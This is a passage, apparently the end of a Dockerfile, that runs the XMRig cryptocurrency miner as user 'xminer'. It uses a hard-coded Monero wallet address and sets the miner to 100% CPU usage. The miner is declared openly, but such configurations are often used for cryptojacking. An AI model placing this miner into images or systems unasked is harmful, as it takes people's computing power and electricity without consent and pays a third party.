...
USER xminer
WORKDIR /xmrig
ENTRYPOINT ["./xmrig", "--algo=cryptonight", "--user=454iEHPcqfzES8GqwFopzq1H2aTc7mtE5F5xXWnW8MbNd2DsM1nFa2m4FEi2S3fijMMN4B54Dyrb61HDEJdXtGXPUVKyH7L", "--pass=x", "--max-cpu-usage=100"]
